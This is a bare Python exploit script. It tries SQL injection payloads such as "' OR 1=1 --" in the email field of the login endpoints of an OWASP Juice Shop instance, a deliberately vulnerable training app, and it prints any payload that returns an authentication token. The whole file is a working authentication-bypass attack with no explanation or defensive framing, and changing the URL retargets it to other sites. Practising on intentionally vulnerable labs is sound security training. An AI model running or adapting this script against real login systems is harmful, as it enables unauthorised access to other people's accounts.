import requests

url = 'https://juice-shop.herokuapp.com'
possible_payloads = ["' OR 1=1 --", "' OR '1'='1", "example@examplo.com' --"]
endpoints = ['rest/user/login', 'rest/user/authentication-details']
valid_tries = []

for ep in endpoints:
    full_url = f"{url}/{ep}"
    for payload in possible_payloads:
        data = {"email": payload, "password": "passwd"}
        response = requests.post(full_url, json=data)
        try:
            response_data = response.json()
            if response.status_code == 200 and 'authentication' in response_data:
                print(f"[+] SQL Injection successful on endpoint {full_url} with payload: {payload}")
                valid_tries.append(
                    {"url": full_url, "request_fields": {"email": payload, "password": "passwd"}})
                break
        except (requests.exceptions.RequestException, ValueError):
            continue

if valid_tries:
    print("SQL Injection attempts:")
    for attempt in valid_tries:
        print(attempt)
else:
    print("[-] SQL Injection unsuccessful")
